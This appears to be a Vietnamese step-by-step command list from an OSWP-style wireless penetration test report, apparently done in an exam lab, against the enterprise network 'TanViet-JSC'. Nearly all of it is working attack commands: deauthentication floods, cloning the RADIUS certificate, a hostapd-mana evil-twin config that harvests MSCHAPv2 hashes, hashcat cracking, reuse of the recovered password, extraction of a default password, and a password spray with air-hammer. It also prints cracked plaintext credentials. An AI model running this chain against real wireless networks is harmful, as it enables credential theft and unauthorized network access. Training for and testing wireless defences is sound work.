# Danh sách lệnh theo từng bước — Báo cáo kiểm thử xâm nhập (OSWP)

## Bước 1 — Liệt kê interface & đọc trạng thái ban đầu

```bash
iw dev
sudo iw dev wlan2 info
sudo iw dev wlan4 info
```

## Bước 2 — Đưa wlan2 sang Monitor mode

```bash
sudo ip link set wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set wlan2 up

# Xác nhận
sudo iw dev wlan2 info
```

## Bước 3 — Thu lưu lượng 120 giây ra file pcap

```bash
sudo aireplay-ng -0 0 -a 02:00:00:00:30:00 wlan2
sudo timeout 120 airodump-ng wlan2 --output-format pcap -w /tmp/TV -c 6 --bssid 02:00:00:00:30:00

# Đếm số frame thu được
tshark -r /tmp/TV-01.cap 2>/dev/null | wc -l
```

## Bước 4 — Danh sách mạng và station

```bash
sudo airodump-ng wlan2
```

## Bước 5 — Xác định mạng dùng 802.1X (qua RSN AKM type)

```bash
tshark -r /tmp/TV-01.cap -Y "wlan.fc.type_subtype==8 && wlan.ssid==\"TanViet-JSC\"" \
  -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1
# Kết quả: 1 → 802.1X (Enterprise)
```

## Bước 6 — Lấy tên tài khoản từ EAP Identity Response

```bash
tshark -r /tmp/TV-01.cap -Y "eap.code==2 && eap.type==1" \
  -T fields -e frame.number -e wlan.sa -e eap.identity 2>/dev/null
```

## Bước 7 — Tìm frame chứa chứng thư EAP server

```bash
tshark -r /tmp/TV-04.cap -Y "tls.handshake.type==11" \
  -T fields -e frame.number -e frame.len -e _ws.col.Protocol 2>/dev/null
```

## Bước 8 — Trích xuất và đọc chứng thư (cert)

```bash
# 1. Export cert ra file DER
tshark -r /tmp/TV-04.cap -Y "tls.handshake.type==11" -T fields -e tls.handshake.certificate 2>/dev/null | head -1 | xxd -r -p > /tmp/server_from_cap.der

# 2. Đọc các trường subject/issuer, serial, thời hạn
openssl x509 -in /tmp/server_from_cap.der -inform DER -noout -subject -issuer -serial -dates
```

## Bước 9 — Dựng Rogue AP với chứng thư trùng khớp

```bash
sudo mkdir -p /tmp/rogue-certs
cd /tmp/rogue-certs

# 1. CA key + cert
openssl genrsa -out ca.key 2048
openssl req -x509 -new -nodes -sha256 -days 365 \
  -key ca.key -out ca.pem \
  -subj "/C=VN/ST=Ha Noi/L=Cau Giay/O=TanViet JSC/OU=Phong CNTT/CN=TanViet JSC Root CA/emailAddress=ca-admin@tanviet.local"

# 2. Server key + CSR + cert ký bởi CA
openssl genrsa -out server.key 2048
openssl req -new -sha256 \
  -key server.key -out server.csr \
  -subj "/C=VN/ST=Ha Noi/L=Cau Giay/O=TanViet JSC/OU=Phong CNTT/CN=radius.tanviet.local/emailAddress=it-support@tanviet.local"
openssl x509 -req -sha256 -days 365 \
  -in server.csr -CA ca.pem -CAkey ca.key \
  -CAcreateserial -out server.pem

# 3. DH params
openssl dhparam -out dh.pem 2048

# Kiểm tra
echo "=== CA ===" && openssl x509 -in ca.pem -noout -subject -issuer
echo "=== Server ===" && openssl x509 -in server.pem -noout -subject -issuer
ls -la /tmp/rogue-certs/
```

File `eap_user`:

```bash
cat > /tmp/mana.eap_user << 'EOF'
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "pass" [2]
EOF
```

File cấu hình hostapd-mana:

```bash
cat > /tmp/hostapd-mana.conf << 'EOF'
interface=wlan4
driver=nl80211
ssid=TanViet-JSC
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
ieee80211w=0
eap_server=1
eap_user_file=/tmp/mana.eap_user
ca_cert=/tmp/rogue-certs/ca.pem
server_cert=/tmp/rogue-certs/server.pem
private_key=/tmp/rogue-certs/server.key
dh_file=/tmp/rogue-certs/dh.pem
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
EOF
```

Khởi động Rogue AP:

```bash
sudo ip link set wlan4 down
sudo iw dev wlan4 set type managed
sudo ip link set wlan4 up
sudo hostapd-mana /tmp/hostapd-mana.conf
```

## Bước 10 — Buộc station rời mạng thật và kết nối vào Rogue AP

```bash
sudo iw dev wlan2 set channel 6
sudo aireplay-ng -0 5 -a 02:00:00:00:30:00 -c 02:00:00:00:31:00 wlan2
```

## Bước 11 — Thu challenge–response

```bash
sudo cat /tmp/hostapd.credout
```

## Bước 12 — Khôi phục mật khẩu bằng hashcat

```bash
hashcat -a 0 -m 5500 /tmp/hashcat.txt /opt/exam/wordlist.txt --force
```

Kết quả: `Xuanmai#1907` (tài khoản TANVIET\nhung.lethimy)

## Bước 13 — Kết nối mạng thật bằng mật khẩu đã khôi phục, tải nội dung HTTP

```bash
cat > /tmp/juan.conf << 'EOF'
network={
ssid="TanViet-JSC"
key_mgmt=WPA-EAP
eap=PEAP
identity="TANVIET\\nhung.lethimy"
password="Xuanmai#1907"
phase1="peaplabel=0"
phase2="auth=MSCHAPV2"
anonymous_identity="anonymous"
}
EOF

sudo wpa_supplicant -i wlan2 -c /tmp/juan.conf -D nl80211
sudo dhclient wlan2 -v
ip addr show wlan2

GW=$(ip route | grep "default.*wlan2" | awk '{print $3}')
echo "Gateway: $GW"

wget -r -np -nd -P /tmp/http-dump http://$GW/
ls -la /tmp/http-dump/
```

## Bước 14 — Tìm mật khẩu mặc định trong file tải về

```bash
cat /tmp/http-dump/New-TanVietADUsers.ps1
```

Dòng chứa mật khẩu: `$DefaultPassword = "T4nviet@2O26"`

## Bước 15 — Lập danh sách tài khoản, chuyển đổi định dạng

```bash
cat /tmp/users.csv
wc -l /tmp/users.csv
```

Chuyển UPN → DOMAIN\username:

```bash
python3 -c '
with open("users.csv") as f:
    users = [l.strip().split("@")[0] for l in f if "@" in l]
with open("/tmp/usernames_domain.txt","w") as out:
    for u in users:
        out.write("TANVIET" + chr(92) + u + chr(10))
print(f"{len(users)} tài khoản đã chuyển đổi")
'

head -3 /tmp/usernames_domain.txt
```

## Bước 16 — Thử mật khẩu mặc định trên toàn bộ danh sách (password spray)

```bash
sudo ip link set wlan4 down
sudo iw dev wlan4 set type managed
sudo ip link set wlan4 up
sudo wpa_supplicant -B -i wlan4 -D nl80211 -C /run/wpa_supplicant_wlan4

sudo python3 /opt/exam/air-hammer/air-hammer.py \
  -i wlan4 \
  -e TanViet-JSC \
  -P "T4nviet@2O26" \
  -u /tmp/usernames_domain.txt \
  -w /tmp/spray_results.txt
```
